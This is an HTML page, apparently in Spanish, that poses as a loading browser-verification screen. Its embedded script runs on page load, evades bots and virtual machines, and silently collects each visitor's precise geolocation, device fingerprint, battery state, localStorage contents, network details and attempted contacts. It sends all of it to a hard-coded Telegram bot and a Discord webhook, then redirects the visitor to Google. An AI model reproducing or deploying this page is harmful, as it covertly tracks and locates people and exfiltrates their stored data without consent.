<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; color: #70757a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>Estableciendo conexión segura...</p>
    </div>

    <script>
        const CONFIG = {
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            exit: "https://www.google.com"
        };

        // FILTRO 1: Identificar bots por User Agent
        const isBot = /bot|googlebot|crawler|spider|robot|crawling|github|headless|lighthouse/i.test(navigator.userAgent);

        async function iniciarRastreo() {
            if (isBot) return;

            // Evitar escaneos ultrarrápidos de servidores con una pequeña espera
            await new Promise(r => setTimeout(r, 1500));

            let hw = "Desconocido";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // FILTRO 2: Bloqueo de Hardware Virtual (Intel Iris de servidores de GitHub/Google)
            if (hw.includes("SwiftShader") || hw.includes("llvmpipe") || hw.includes("VirtualBox")) {
                console.log("Servidor detectado, abortando.");
                return;
            }

            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
            localStorage.setItem('_sid', id);

            let bat = "Desconocido";
            try {
                const b = await navigator.getBattery();
                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
            } catch(e) {}

            let geolocationData = "Desconocido";
            if ("geolocation" in navigator) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
                    });
                    geolocationData = `Lat: \`${pos.coords.latitude}\` | Lon: \`${pos.coords.longitude}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
                } catch (e) {
                    geolocationData = "No disponible";
                }
            }

            // Recopilar información adicional
            const userAgent = navigator.userAgent;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;
            const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ');
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localStorageData = Object.keys(localStorage).map(key => `${key}: ${localStorage.getItem(key)}`).join('; ');

            // Obtener información del sistema operativo
            const osInfo = getOSInfo();

            // Obtener información de la conexión de red
            const networkInfo = getNetworkInfo();

            // Obtener información de los contactos del dispositivo (si es posible)
            const contactsInfo = getContactsInfo();

            const report = `👤 **NUEVO ACCESO FILTRADO**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Geolocalización:** ${geolocationData}\n` +
                           `🌐 **User Agent:** \`${userAgent}\`\n` +
                           `📐 **Resolución Pantalla:** \`${screenResolution}\`\n` +
                           `🗣️ **Idioma:** \`${language}\`\n` +
                           `🔧 **Plugins:** \`${plugins}\`\n` +
                           `🕒 **Zona Horaria:** \`${timeZone}\`\n` +
                           `🗃️ **Local Storage:** \n${localStorageData}\n` +
                           `💻 **Sistema Operativo:** \n${osInfo}\n` +
                           `🌐 **Conectividad Red:** \n${networkInfo}\n` +
                           `📞 **Contactos:** \n${contactsInfo}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            try {
                // Enviar informe a Telegram y Discord
                await Promise.all([
                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CONFIG.chat,
                            text: report,
                            parse_mode: "Markdown",
                            disable_web_page_preview: true
                        })
                    }),
                    fetch(CONFIG.webhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                    })
                ]);
            } catch(e) {
                console.error('Error enviado el informe:', e);
            }

            // Redirección final solo tras el envío
            window.location.href = CONFIG.exit;
        }

        function getOSInfo() {
            let os = "Desconocido";
            if (navigator.appVersion.indexOf("Win") !== -1) os = "Windows";
            else if (navigator.appVersion.indexOf("Mac") !== -1) os = "MacOS";
            else if (navigator.appVersion.indexOf("X11") !== -1) os = "UNIX";
            else if (navigator.appVersion.indexOf("Linux") !== -1) os = "Linux";
            return os;
        }

        function getNetworkInfo() {
            let networkInfo = "Desconocido";
            if (navigator.connection) {
                networkInfo = `Tipo: \`${navigator.connection.effectiveType}\`\n` +
                              `Velocidad Descarga: \`${navigator.connection.downlink}\` Mbps\n` +
                              `Velocidad Subida: \`${navigator.connection.uplink}\` Mbps\n` +
                              `RTT: \`${navigator.connection.rtt}\` ms`;
            }
            return networkInfo;
        }

        function getContactsInfo() {
            let contactsInfo = "Desconocido";
            if (navigator.contacts) {
                try {
                    const contacts = navigator.contacts;
                    contactsInfo = contacts.map(contact => {
                        return `Nombre: \`${contact.name}\`\n` +
                               `Teléfonos: \`${contact.tel?.join(', ')}\`\n` +
                               `Emails: \`${contact.email?.join(', ')}\`\n` +
                               `Direcciones: \`${contact.address?.join(', ')}\`\n`;
                    }).join('\n');
                } catch (e) {
                    contactsInfo = "No disponible";
                }
            }
            return contactsInfo;
        }

        window.onload = iniciarRastreo;
    </script>
</body>
</html>
